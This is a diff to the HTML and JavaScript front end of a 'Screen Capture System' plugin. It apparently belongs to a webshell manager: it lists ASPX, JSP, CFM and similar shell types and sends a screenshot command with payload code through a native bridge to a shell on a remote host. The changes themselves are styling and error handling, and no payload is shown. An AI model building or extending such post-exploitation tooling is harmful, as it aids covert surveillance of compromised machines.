@@ -5,7 +5,7 @@
     <title>Screen Capture System</title>
     <style>
         html, body {
-            height: 100%;
+            min-height: 100%;
             margin: 0;
             padding: 0;
             background-color: #000000;
@@ -18,6 +18,9 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+            padding: 20px;
         }
         
         .container { 
@@ -27,6 +30,8 @@
             padding: 25px; 
             border-radius: 0px;
             border: 1px solid #ffffff;
+            box-sizing: border-box;
+            margin: auto; 
         }
         
         h2 { 
@@ -52,12 +57,6 @@
         .badge-active { background: #ffffff; color: #000000; }
         .badge-error { border: 1px dashed #ffffff; background: transparent; color: #ffffff; }
         
-        .form-row {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-        
         .form-group { flex: 1; margin-bottom: 15px; }
         
         label { 
@@ -69,7 +68,7 @@
             font-weight: bold;
         }
         
-        input[type="text"], select { 
+        input[type="text"] { 
             width: 100%; 
             background: #000000; 
             border: 1px solid #ffffff; 
@@ -81,18 +80,9 @@
             font-size: 13px;
         }
         
-        input[type="text"]:focus, select:focus {
+        input[type="text"]:focus {
             outline: none;
             background: #111111;
-        }
-        
-        select {
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url("data:image/svg+xml;utf8,<svg fill='white' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></path></svg>");
-            background-repeat: no-repeat;
-            background-position-x: 95%;
-            background-position-y: 50%;
         }
         
         button { 
@@ -154,7 +144,7 @@
             background: #000000; 
             border: 1px dashed #444444; 
             padding: 10px; 
-            height: 90px; 
+            height: 120px; 
             overflow-y: auto; 
             white-space: pre-wrap;
             font-size: 11px;
@@ -177,17 +167,6 @@
     <div class="status-bar" id="statusBar">
         [*] Initializing display driver... awaiting bridge...
     </div>
-    
-    <div class="form-row">
-        <div class="form-group">
-            <label>> Capture Quality (JPEG)</label>
-            <select id="uiQuality" onchange="updateJsonConfig()">
-                <option value="50">50% (LOW BANDWIDTH)</option>
-                <option value="75" selected>75% (BALANCED)</option>
-                <option value="100">100% (LOSSLESS IMAGING)</option>
-            </select>
-        </div>
-    </div>
 
     <div class="form-group">
         <label>> Transmitted Config (JSON Target)</label>
@@ -208,12 +187,9 @@
 <script>
     const pluginManifest = {
         "supportedLangs": [
-            // .NET
             "ASHX/NebulaPulsar/DarkMatter",
             "ASMX/NebulaPulsar/DarkMatter",
             "ASPX/NebulaPulsar/DarkMatter",
-
-            // Java
             "JSP/NebulaPulsar/DarkMatter",
             "JSPX/NebulaPulsar/DarkMatter",
             "CFM/NebulaPulsar/DarkMatter",
@@ -223,10 +199,8 @@
     let currentShellType = "";
 
     function updateJsonConfig() {
-        const quality = document.getElementById('uiQuality').value;
         const configObj = {
-            "action": "screenshot",
-            "quality": quality
+            "action": "screenshot"
         };
         document.getElementById('targetJson').value = JSON.stringify(configObj);
     }
@@ -291,7 +265,7 @@
         const imgTarget = document.getElementById('screenshotTarget');
         const imgPlaceholder = document.getElementById('imgPlaceholder');
         
-        appendLog(`[*] STAGING DRAW INSTRUCTIONS [QUALITY: ${JSON.parse(jsonConfig).quality}%]`);
+        appendLog(`[*] STAGING DRAW INSTRUCTIONS...`);
 
         try {
             if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
@@ -304,14 +278,27 @@
                 
                 let base64Result = await bridge.fnRun(jsonConfig, payloadCode, currentShellType);
                 if (base64Result.startsWith("ERROR://"))
-                    throw base64Result;
+                    throw new Error(base64Result);
                 
                 base64Result = base64Result.trim();
+
+                if (base64Result.length < 200) {
+                    try {
+                        const decodedResult = atob(base64Result);
+                        if (decodedResult.includes("ERROR") || decodedResult.includes("Failed")) {
+                            appendLog("[-] " + decodedResult);
+                            return;
+                        }
+                    } catch (decodeErr) {
+                        appendLog("[-] RECEIVED INVALID RESPONSE: " + base64Result);
+                        return;
+                    }
+                }
 
                 if (base64Result && !base64Result.startsWith("[-]")) {
                     appendLog("[+] RAW BITSTREAM RECEIVED. DECODING GRAPHICS BUFFER...");
                     
-                    imgTarget.src = "data:image/jpeg;base64," + base64Result;
+                    imgTarget.src = "data:image/png;base64," + base64Result;
                     imgTarget.style.display = "block";
                     imgPlaceholder.style.display = "none";
                 } else {
